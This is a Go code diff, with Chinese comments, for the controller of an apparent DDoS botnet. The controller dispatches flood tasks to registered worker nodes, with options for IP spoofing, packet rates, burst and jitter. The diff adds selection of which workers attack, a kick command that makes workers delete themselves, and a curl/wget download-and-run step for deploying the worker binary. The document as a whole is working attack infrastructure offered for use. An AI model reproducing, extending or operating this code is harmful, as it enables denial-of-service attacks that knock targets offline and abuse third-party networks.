@@ -43,6 +43,10 @@ type NodeInfo struct {
 	Status        string    `json:"status"`
 	LastHeartbeat time.Time `json:"last_heartbeat"`
 	IsWindows     bool      `json:"is_windows"`
+	// CanSpoof 表示该节点是否支持 IP 伪造：
+	// 默认按平台标记（非 Windows + 编译支持 = true，待探测确认），
+	// spoof-probe 探测失败后置 false
+	CanSpoof bool `json:"can_spoof"`
 }
 
 type SubAttackInfo struct {
@@ -57,26 +61,28 @@ type SubAttackInfo struct {
 }
 
 type TaskInfo struct {
-	TaskID        string                `json:"task_id"`
-	Target        string                `json:"target"`
-	Method        string                `json:"method"`
-	Duration      int32                 `json:"duration"`
-	Threads       int32                 `json:"threads"`
-	PacketSize    int32                 `json:"packet_size"`
-	Mix           bool                  `json:"mix"`
-	Game          string                `json:"game"`
-	RateLimitPPS  int64                 `json:"rate_limit_pps"`
-	RateLimitBPS  int64                 `json:"rate_limit_bps"`
-	BurstMode     bool                  `json:"burst_mode"`
-	JitterMs      int32                 `json:"jitter_ms"`
-	SpoofIP       bool                  `json:"spoof_ip"`
-	FallbackToUDP bool                  `json:"fallback_to_udp"`
-	SubAttacks    []SubAttackInfo       `json:"sub_attacks,omitempty"`
-	Status        string                `json:"status"`
-	CreatedAt     time.Time             `json:"created_at"`
-	Workers       map[string]*TaskStats `json:"workers"`
-	RetryCount    int                   `json:"retry_count"`
-	StartTime     time.Time             `json:"start_time"`
+	TaskID        string          `json:"task_id"`
+	Target        string          `json:"target"`
+	Method        string          `json:"method"`
+	Duration      int32           `json:"duration"`
+	Threads       int32           `json:"threads"`
+	PacketSize    int32           `json:"packet_size"`
+	Mix           bool            `json:"mix"`
+	Game          string          `json:"game"`
+	RateLimitPPS  int64           `json:"rate_limit_pps"`
+	RateLimitBPS  int64           `json:"rate_limit_bps"`
+	BurstMode     bool            `json:"burst_mode"`
+	JitterMs      int32           `json:"jitter_ms"`
+	SpoofIP       bool            `json:"spoof_ip"`
+	FallbackToUDP bool            `json:"fallback_to_udp"`
+	SubAttacks    []SubAttackInfo `json:"sub_attacks,omitempty"`
+	// SelectedWorkers 指定参与任务的节点；空 = 全部在线节点
+	SelectedWorkers []string              `json:"selected_workers,omitempty"`
+	Status          string                `json:"status"`
+	CreatedAt       time.Time             `json:"created_at"`
+	Workers         map[string]*TaskStats `json:"workers"`
+	RetryCount      int                   `json:"retry_count"`
+	StartTime       time.Time             `json:"start_time"`
 	// CancelAcks 记录已确认收到取消指令的 worker（key=workerID）。
 	// 任务须待所有持有它的在线 worker 全部确认后才结束，避免多 worker 停战失效。
 	CancelAcks map[string]bool `json:"-"`
@@ -107,6 +113,7 @@ type Ctrl struct {
 	mu                sync.RWMutex
 	regMu             sync.Mutex // 注册互斥体：串行化 Register/Deregister，防止同一 worker 并发注册导致反复上线
 	nodes             map[string]*NodeInfo
+	kicked            map[string]bool // 被踢出的 worker：心跳返回 kick，等待其自行退出
 	tasks             map[string]*TaskInfo
 	templates         map[string]AttackTemplate
 	pendingIDs        []string
@@ -248,6 +255,7 @@ func New(grpcAddr, httpAddr string, build BuildInfo) *Ctrl {
 
 	ctrl := &Ctrl{
 		nodes:             make(map[string]*NodeInfo),
+		kicked:            make(map[string]bool),
 		tasks:             make(map[string]*TaskInfo),
 		templates:         make(map[string]AttackTemplate),
 		wsClients:         make(map[*WSClient]bool),
@@ -367,6 +375,7 @@ func (c *Ctrl) Start() error {
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/api/nodes", c.authHTTP(c.handleNodes))
+	mux.HandleFunc("/api/nodes/", c.authHTTP(c.handleKickNode))
 	mux.HandleFunc("/api/tasks", c.authHTTP(c.handleTasks))
 	mux.HandleFunc("/api/tasks/", c.authHTTP(c.handleTaskByID))
 	mux.HandleFunc("/api/scan", c.authHTTP(c.handleScan))
@@ -549,6 +558,13 @@ func (c *Ctrl) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.Regis
 			assignedID = fmt.Sprintf("%s%d", baseID, suffix)
 		}
 
+		// 默认标记 IP 伪造能力：Windows 不支持，其他平台标记为可伪造
+		// （实际能力由 spoof-probe 探测确认，失败后置 false）
+		canSpoof := !req.IsWindows
+		if attack.SupportsSpoofing() == false && !req.IsWindows {
+			canSpoof = false
+		}
+
 		node := &NodeInfo{
 			WorkerID:      assignedID,
 			CPU:           req.CpuCores,
@@ -559,6 +575,7 @@ func (c *Ctrl) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.Regis
 			Status:        "READY",
 			LastHeartbeat: time.Now(),
 			IsWindows:     req.IsWindows,
+			CanSpoof:      canSpoof,
 		}
 
 		if p, ok := peerFromContext(ctx); ok {
@@ -607,6 +624,7 @@ func (c *Ctrl) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.Hea
 	}
 	c.mu.Lock()
 	node, ok := c.nodes[req.WorkerId]
+	kicked := c.kicked[req.WorkerId]
 	if ok {
 		node.LastHeartbeat = time.Now()
 		// 只在非攻击态时恢复 READY：攻击中的节点保持 ATTACKING，
@@ -623,6 +641,10 @@ func (c *Ctrl) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.Hea
 	if !ok {
 		return &pb.HeartbeatResponse{Ok: false}, fmt.Errorf("unknown node")
 	}
+	if kicked {
+		// 已被踢出：返回 kick 标志让 worker 自行退出并删除自身
+		return &pb.HeartbeatResponse{Ok: true, Kick: true}, nil
+	}
 
 	var pendingTask *pb.AttackTask
 	var cancelTaskID string
@@ -633,6 +655,11 @@ func (c *Ctrl) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.Hea
 	for _, tid := range c.pendingIDs {
 		t := c.tasks[tid]
 		if t == nil || t.Status != "pending" {
+			continue
+		}
+		// 任务指定了参与节点：非选中节点跳过（不派发也不计入完成判定）
+		if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, req.WorkerId) {
+			rem = append(rem, tid)
 			continue
 		}
 		if c.workerHasTask(t, req.WorkerId) {
@@ -691,20 +718,21 @@ func (c *Ctrl) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.Hea
 
 func (c *Ctrl) taskToProto(t *TaskInfo) *pb.AttackTask {
 	pt := &pb.AttackTask{
-		TaskId:        t.TaskID,
-		Target:        t.Target,
-		Method:        t.Method,
-		Duration:      t.Duration,
-		Threads:       t.Threads,
-		PacketSize:    t.PacketSize,
-		Mix:           t.Mix,
-		Game:          t.Game,
-		RateLimitPps:  t.RateLimitPPS,
-		RateLimitBps:  t.RateLimitBPS,
-		BurstMode:     t.BurstMode,
-		JitterMs:      t.JitterMs,
-		SpoofIp:       t.SpoofIP,
-		FallbackToUdp: t.FallbackToUDP,
+		TaskId:          t.TaskID,
+		Target:          t.Target,
+		Method:          t.Method,
+		Duration:        t.Duration,
+		Threads:         t.Threads,
+		PacketSize:      t.PacketSize,
+		Mix:             t.Mix,
+		Game:            t.Game,
+		RateLimitPps:    t.RateLimitPPS,
+		RateLimitBps:    t.RateLimitBPS,
+		BurstMode:       t.BurstMode,
+		JitterMs:        t.JitterMs,
+		SpoofIp:         t.SpoofIP,
+		FallbackToUdp:   t.FallbackToUDP,
+		SelectedWorkers: t.SelectedWorkers,
 	}
 	for _, sub := range t.SubAttacks {
 		pt.SubAttacks = append(pt.SubAttacks, &pb.SubAttack{
@@ -933,6 +961,9 @@ func cloneTask(t *TaskInfo) *TaskInfo {
 	if t.SubAttacks != nil {
 		cp.SubAttacks = append([]SubAttackInfo(nil), t.SubAttacks...)
 	}
+	if t.SelectedWorkers != nil {
+		cp.SelectedWorkers = append([]string(nil), t.SelectedWorkers...)
+	}
 	if t.Workers != nil {
 		cp.Workers = make(map[string]*TaskStats, len(t.Workers))
 		for k, v := range t.Workers {
@@ -953,14 +984,19 @@ func (c *Ctrl) listNodesLocked() []*NodeInfo {
 }
 
 // onlineWorkersAllAssigned 必须在持有 c.mu 时调用。
-// 返回 true 表示当前所有在线（非 OFFLINE）Worker 都已领取该 task，
+// 返回 true 表示当前所有在线（非 OFFLINE）目标 Worker 都已领取该 task，
 // 即 pending 派发窗口已覆盖全部可用 Worker，可翻转为 running。
-// 若当前没有任何在线 Worker，则要求 task 至少已派给一个 Worker 才算完成
+// 任务指定 SelectedWorkers 时只统计选中节点；未指定时统计全部在线节点。
+// 若当前没有任何在线目标 Worker，则要求 task 至少已派给一个 Worker 才算完成
 // （避免在零在线节点时把刚创建、还没派发的 task 直接翻转）。
 func (c *Ctrl) onlineWorkersAllAssigned(t *TaskInfo) bool {
 	onlineCount := 0
 	for id, n := range c.nodes {
 		if n.Status == "OFFLINE" {
+			continue
+		}
+		// 任务指定了参与节点：只统计选中的
+		if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, id) {
 			continue
 		}
 		onlineCount++
@@ -969,7 +1005,7 @@ func (c *Ctrl) onlineWorkersAllAssigned(t *TaskInfo) bool {
 		}
 	}
 	if onlineCount == 0 {
-		// 没有在线 Worker：只要已派给过至少一个（可能刚掉线的）Worker 就算派发完成。
+		// 没有在线目标 Worker：只要已派给过至少一个（可能刚掉线的）Worker 就算派发完成。
 		return len(t.Workers) > 0
 	}
 	return true
@@ -1074,6 +1110,57 @@ func (c *Ctrl) handleNodes(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, nodes)
 }
 
+// handleKickNode POST /api/nodes/:id/kick
+// 踢出节点：标记 kicked，worker 下次心跳收到 kick 标志后自行退出并删除自身。
+// 同时从节点表中移除（防止未退出的 worker 继续收到任务）。
+func (c *Ctrl) handleKickNode(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, `{"error":"POST required"}`, 405)
+		return
+	}
+	id := strings.TrimPrefix(r.URL.Path, "/api/nodes/")
+	id = strings.TrimSuffix(id, "/kick")
+	if id == "" {
+		http.Error(w, `{"error":"missing node id"}`, 400)
+		return
+	}
+
+	c.mu.Lock()
+	if _, ok := c.nodes[id]; !ok {
+		c.mu.Unlock()
+		writeJSON(w, map[string]interface{}{"error": "node not found"})
+		return
+	}
+	c.kicked[id] = true
+	delete(c.nodes, id)
+	c.mu.Unlock()
+
+	log.Printf("[node] %s kicked (will self-exit on next heartbeat)", id)
+	c.broadcastWS("nodes", c.listNodesForBroadcast())
+	writeJSON(w, map[string]interface{}{"ok": true})
+}
+
+// handleUnkickNode DELETE /api/nodes/:id/kick
+// 撤销踢出（worker 尚未退出时误踢可反悔）
+func (c *Ctrl) handleUnkickNode(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "DELETE" {
+		http.Error(w, `{"error":"DELETE required"}`, 405)
+		return
+	}
+	id := strings.TrimPrefix(r.URL.Path, "/api/nodes/")
+	id = strings.TrimSuffix(id, "/kick")
+	if id == "" {
+		http.Error(w, `{"error":"missing node id"}`, 400)
+		return
+	}
+
+	c.mu.Lock()
+	delete(c.kicked, id)
+	c.mu.Unlock()
+	log.Printf("[node] %s unkicked", id)
+	writeJSON(w, map[string]interface{}{"ok": true})
+}
+
 func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 	if r.Method == "POST" {
 		var req struct {
@@ -1094,6 +1181,8 @@ func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 			// worker 上无法到达目标，默认降级可避免 4/5 的节点做无效攻击。
 			FallbackToUDP *bool           `json:"fallback_to_udp"`
 			SubAttacks    []SubAttackInfo `json:"sub_attacks"`
+			// Workers 指定参与任务的节点 ID 列表；空 = 全部在线节点
+			Workers []string `json:"workers"`
 		}
 		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 			writeJSON(w, map[string]string{"error": "invalid request: " + err.Error()})
@@ -1155,10 +1244,28 @@ func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 		}
 
 		c.mu.RLock()
+		// 指定了 workers：校验所有选中节点存在且在线；未指定：统计全部在线节点
 		onlineCount := 0
-		for _, n := range c.nodes {
-			if n.Status == "READY" || n.Status == "ATTACKING" {
-				onlineCount++
+		if len(req.Workers) > 0 {
+			validWorkers := make([]string, 0, len(req.Workers))
+			for _, wid := range req.Workers {
+				n, ok := c.nodes[wid]
+				if !ok {
+					c.mu.RUnlock()
+					writeJSON(w, map[string]string{"error": "unknown worker: " + wid})
+					return
+				}
+				if n.Status == "READY" || n.Status == "ATTACKING" {
+					validWorkers = append(validWorkers, wid)
+					onlineCount++
+				}
+			}
+			req.Workers = validWorkers
+		} else {
+			for _, n := range c.nodes {
+				if n.Status == "READY" || n.Status == "ATTACKING" {
+					onlineCount++
+				}
 			}
 		}
 		c.mu.RUnlock()
@@ -1177,24 +1284,25 @@ func (c *Ctrl) handleTasks(w http.ResponseWriter, r *http.Request) {
 			fallbackToUDP = *req.FallbackToUDP
 		}
 		task := &TaskInfo{
-			TaskID:        taskID,
-			Target:        target,
-			Method:        req.Method,
-			Duration:      req.Duration,
-			Threads:       req.Threads,
-			PacketSize:    req.PacketSize,
-			Mix:           req.Mix,
-			Game:          req.Game,
-			RateLimitPPS:  req.RateLimitPPS,
-			RateLimitBPS:  req.RateLimitBPS,
-			BurstMode:     req.BurstMode,
-			JitterMs:      req.JitterMs,
-			SpoofIP:       req.SpoofIP,
-			FallbackToUDP: fallbackToUDP,
-			SubAttacks:    req.SubAttacks,
-			Status:        "pending",
-			CreatedAt:     time.Now(),
-			Workers:       make(map[string]*TaskStats),
+			TaskID:          taskID,
+			Target:          target,
+			Method:          req.Method,
+			Duration:        req.Duration,
+			Threads:         req.Threads,
+			PacketSize:      req.PacketSize,
+			Mix:             req.Mix,
+			Game:            req.Game,
+			RateLimitPPS:    req.RateLimitPPS,
+			RateLimitBPS:    req.RateLimitBPS,
+			BurstMode:       req.BurstMode,
+			JitterMs:        req.JitterMs,
+			SpoofIP:         req.SpoofIP,
+			FallbackToUDP:   fallbackToUDP,
+			SubAttacks:      req.SubAttacks,
+			SelectedWorkers: req.Workers,
+			Status:          "pending",
+			CreatedAt:       time.Now(),
+			Workers:         make(map[string]*TaskStats),
 		}
 
 		c.mu.Lock()
@@ -1617,8 +1725,14 @@ func (c *Ctrl) handleDeployCommand(w http.ResponseWriter, r *http.Request) {
 		workerCmd += " -daemon"
 	}
 
+	// 下载工具：curl（默认）或 wget，前端可切换
+	download := "curl -fsSL \"" + storageURL + "\" -o worker"
+	if r.URL.Query().Get("tool") == "wget" {
+		download = "wget -q -O worker \"" + storageURL + "\""
+	}
+
 	parts := []string{
-		"curl -fsSL \"" + storageURL + "\" -o worker",
+		download,
 		"chmod +x worker",
 		workerCmd,
 	}
